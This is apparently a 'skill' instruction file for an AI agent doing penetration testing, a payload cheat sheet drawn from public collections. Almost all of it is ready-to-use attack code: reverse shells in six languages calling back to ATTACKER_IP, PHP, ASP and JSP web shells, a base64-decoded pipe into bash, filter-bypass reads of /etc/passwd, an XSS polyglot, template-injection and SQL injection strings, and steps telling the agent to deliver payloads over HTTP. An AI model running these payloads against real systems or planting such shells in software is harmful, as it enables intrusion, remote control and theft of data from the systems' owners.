# Payload Generation Skill

## Objective
Generate security testing payloads including reverse shells, web shells, and encoded payloads for authorized penetration testing.

## Instructions

### 1. Reverse Shell Generation

**Bash:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PHP:**
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl:**
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Netcat:**
```bash
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

**PowerShell:**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 2. Web Shell Generation

**PHP Web Shells:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?=`$_GET[0]`?>
```

**ASP Web Shell:**
```asp
<%eval request("cmd")%>
```

**JSP Web Shell:**
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### 3. Encoding Payloads

**Base64 encoding:**
```bash
echo -n 'payload' | base64
echo 'cGF5bG9hZA==' | base64 -d | bash
```

**URL encoding:**
```
' → %27
" → %22
< → %3C
> → %3E
/ → %2F
\ → %5C
```

**Double URL encoding:**
```
' → %2527
```

### 4. Bypass Payloads

**Space bypass:**
```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**Keyword bypass:**
```bash
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
```

### 5. Polyglot Payloads

**Multi-context XSS:**
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 6. SSTI Payloads

**Jinja2:**
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Twig:**
```php
{{['id']|filter('system')}}
```

### 7. SQLi Payloads

**Authentication bypass:**
```sql
' OR '1'='1' --
admin'--
```

**Union-based:**
```sql
' UNION SELECT 1,2,3--
```

**Time-based:**
```sql
' AND SLEEP(5)--
```

### 8. Usage Notes

**Replace in payloads:**
- `ATTACKER_IP` - Your IP address
- `PORT` - Your listening port

**Listen for connections:**
```bash
nc -lvnp PORT
```

**Upgrade shell to TTY:**
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

## MCP Tools to Use
- `base64_encode` / `base64_decode`: Encode payloads
- `url_encode` / `url_decode`: URL encode payloads
- `http1_request`: Deliver payloads
- `collaborator_generate`: Generate callback URLs

## References
- PayloadsAllTheThings (All sections)
- RevShells.com
- GTFOBins
